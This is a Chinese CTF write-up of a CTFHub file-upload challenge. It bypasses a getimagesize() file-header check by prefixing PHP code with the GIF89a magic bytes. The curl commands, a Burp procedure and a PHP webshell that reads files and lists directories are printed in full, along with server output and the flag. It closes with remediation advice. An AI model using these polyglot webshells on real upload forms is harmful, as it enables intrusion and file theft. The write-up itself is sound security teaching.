# CTFHub Writeup - 文件头检查

WEB

| 项目 | 内容 |
| --- | --- |
| 题目名称 | CTFHub 文件上传 - 文件头检测 |
| 靶场地址 | `http://challenge-30990e1057ac6039.sandbox.ctfhub.com:10800` |
| 漏洞类型 | 文件上传（图片头校验可绕过） |
| 绕过方式 | 文件开头加 `GIF89a` 魔数，后面接 PHP 代码 |

## 0x02 漏洞原理
上一题（MIME 绕过）只校验了客户端声明的 `Content-Type`；这一题升级了：服务端会**读取文件内容，检查文件头**，常见实现是 `getimagesize()` 或 `finfo_file()`。
`getimagesize()` 的工作方式是读取文件开头的一小段，根据魔数判断图片类型：
- JPEG：`FF D8 FF`
- PNG：`89 50 4E 47`
- GIF：`GIF89a` 或 `GIF87a`
其中 GIF 的头是**可见 ASCII 字符**，手写最方便；JPEG 的头是 `FF D8 FF` 这种二进制字节，PNG 的头是 `89 50 4E 47 0D 0A 1A 0A`，手工构造都没那么顺手。所以做图片马时，GIF 是最常用的格式。
问题在于：**它只认文件头，不关心后面还有什么**。
PHP 解析文件时，只要遇到 `<?php` 就会开始执行，文件前面有几个字节的图片头并不影响。于是把两者拼起来：
```
GIF89a<?php ... ?>
```
`getimagesize()` 看到开头是 `GIF89a`，判定为合法 GIF；PHP 看到后面的 `<?php`，照常执行。这种文件叫「图片马」或 polyglot。
## 0x03 解题过程
**3.1 看页面**
首页还是普通上传表单，没有前端校验：
```html
<form action="" method="post" enctype="multipart/form-data">
    <input type="file" name="file" id="file" />
    <input type="submit" name="submit" value="Submit" />
</form>
```
**3.2 直接传 PHP 被拦**
传一个纯 PHP 文件：
```
curl -F "file=@plain.php;type=image/jpeg" -F "submit=Submit" http://challenge-.../
```
返回：
```
<script>alert('文件错误')</script>
```
把 MIME 改成 `image/gif` 再试，还是「文件错误」。这说明服务端不是只看 MIME，而是真的读了文件内容，发现里面没有图片头。
**3.3 构造图片头 + PHP 的 polyglot**
在 PHP 代码前面加上 GIF 的魔数：
```
GIF89a<?php echo "PWNED_OK"; ?>
```
用十六进制写入更直观：
```
47 49 46 38 39 61              GIF89a
3C 3F 70 68 70 20 ...          <?php ...
```
这里有个细节：`GIF89a` 这 6 个字节就是完整的 GIF 文件头，后面即使不是合法的 GIF 数据，`getimagesize()` 也能识别出类型；而 PHP 解析器会在 `<?php` 处开始执行，前面的 `GIF89a` 只会被当成普通文本输出。
**3.4 上传并验证**
```
curl -F "file=@gifshell.php;type=image/gif" -F "submit=Submit" http://challenge-.../
```
返回：
```
<script>alert('上传成功')</script>
上传文件相对路径<br>upload/gifshell.php
```
访问：
```
http://challenge-.../upload/gifshell.php
```
返回：
```
GIF89aPWNED_OK
```
前面的 `GIF89a` 是文件头被原样输出，后面的 `PWNED_OK` 是 PHP 执行结果——图片马生效，拿到代码执行入口。
**3.5 找 flag**
再传一个带 GIF 头的读文件脚本：
```
GIF89a<?php $p=@$_GET["p"];echo "R:".@file_get_contents($p);$d=@$_GET["d"];if($d!=""){echo "D:";print_r(@scandir($d));} ?>
```
列 Web 根目录：
```
/upload/read.php?d=/var/www/html
```
回显：
```
Array
(
    [0] => .
    [1] => ..
    [2] => flag_3059814260.php
    [3] => index.php
    [4] => upload
)
```
根目录下有一个随机命名的 `flag_3059814260.php`。直接访问它是空响应，因为内容整段是 PHP 注释：
```php
<?php // ctfhub{33b0e827da6a53ef9afaa172}
```
必须读源码：
```
/upload/read.php?p=/var/www/html/flag_3059814260.php
```
回显：
```
GIF89aR:<?php // ctfhub{33b0e827da6a53ef9afaa172}
```
拿到 Flag：
```
ctfhub{33b0e827da6a53ef9afaa172}
```
**3.6 用 Burp 改包**
不用 curl 也可以。浏览器选一个 `.jpg` 正常上传，Burp 抓到后：
- 把 `filename` 改成 `shell.php`；
- 把文件部分的 `Content-Type` 改成 `image/gif`；
- 请求体里确保第一个字节就是 `GIF89a`，后面紧跟 `<?php`；
放行即可。也可以先在本地用文本编辑器把 `GIF89a` 写在文件第一行、后面接 PHP 代码，再直接上传，效果一样。
**3.7 验证**
- 纯 PHP 即使 MIME 改成 `image/gif`，仍然返回「文件错误」，说明校验的是文件头；
- 开头加 `GIF89a` 后上传成功；
- 上传的 `.php` 能执行，说明扩展名没有校验、上传目录允许解析 PHP；
- flag 文件内容与回显一致，长度为 32。
## 0x04 完整流程
| 步骤 | 操作 | 结果 |
| --- | --- | --- |
| 看页面 | 表单无 JS 校验 | 拦截在服务端 |
| 传纯 PHP | `plain.php` + `image/jpeg` | `文件错误` |
| 换 MIME | `plain.php` + `image/gif` | 仍然 `文件错误` |
| 加图片头 | `GIF89a<?php ... ?>` | `上传成功` |
| 验证执行 | 访问 `/upload/gifshell.php` | `GIF89aPWNED_OK` |
| 找 flag | `scandir('/var/www/html')` | `flag_3059814260.php` |
| 读源码 | `file_get_contents` | `<?php // ctfhub{...}` |
整条链路可以概括为：**服务端用 `getimagesize()` 只检查文件头 → 在 PHP 前加 `GIF89a` → 上传 `.php` 并执行 → 读源码拿 flag。**
## 0x05 踩坑记录
1. **只改 MIME 过不了这题**：上一题改 `Content-Type` 就行，这题改成 `image/gif` 仍然「文件错误」，因为服务端读的是文件内容。
2. **图片头要放在最前面**：`GIF89a` 必须是文件的第 1 个字节，前面不能有 BOM、空格或换行，否则 `getimagesize()` 认不出来。
3. **`GIF89a` 只要 6 个字节**：不用构造完整的 GIF 文件，`getimagesize()` 只看文件头就能判定类型，后面接 PHP 代码即可。
4. **`GIF89a` 会被输出到页面**：PHP 解析器只处理 `<?php` 之后的内容，前面的文件头当成普通文本原样输出，所以回显里会多出 `GIF89a`，属于正常现象。
5. **上传目录能解析 PHP**：这是 getshell 的关键，如果目录禁止执行，图片马也没用。
6. **flag 文件直接访问是空的**：`flag_*.php` 的内容是 `<?php // ctfhub{...}`，整行被注释，必须读源码。
7. **`getimagesize()` 不等于安全**：它只校验开头几个字节，后面塞什么都不会管；真正的图片处理要用二次渲染。
8. **上传接口要带 `submit` 字段**：服务端用 `!empty($_POST['submit'])` 判断，少了这个字段文件不会被处理，页面和普通 GET 一样。
## 0x06 修复建议
1. **二次渲染**：用 `imagecreatefromgif()` 读入、`imagegif()` 重新输出，附加在图片后面的代码会被丢掉，这是最彻底的方案。
2. **扩展名白名单 + 重命名**：只允许 `jpg`、`png`、`gif`，用随机串命名，丢弃用户原始文件名。
3. **上传目录禁止执行**：Nginx/Apache 对 `upload/` 关闭 PHP 解析，或把目录放到 Web 根之外。
4. **内容与类型双重校验**：`finfo_file()` 校验 MIME，`getimagesize()` 校验图片，但要知道它们都只看文件头，不能替代目录禁执行。
5. **限制大小和权限**：上传目录只给读写权限，不给执行权限。
6. **分离存储**：上传文件放独立域名或对象存储，配合鉴权下载。
## 0x07 总结
文件头检查比 MIME 检查更进一步，但思路没变：**校验点只看开头，攻击者就在开头造假**。
`getimagesize()` 只读文件头，`GIF89a` 六个字节就能骗过它；PHP 解析器只认 `<?php`，两者一拼，就得到既能过校验又能执行的图片马。
防御上，单纯校验文件头是不够的：要么做二次渲染，把附加内容彻底洗掉；要么从根本上禁止上传目录执行脚本。两者结合，才能真正挡住图片马。
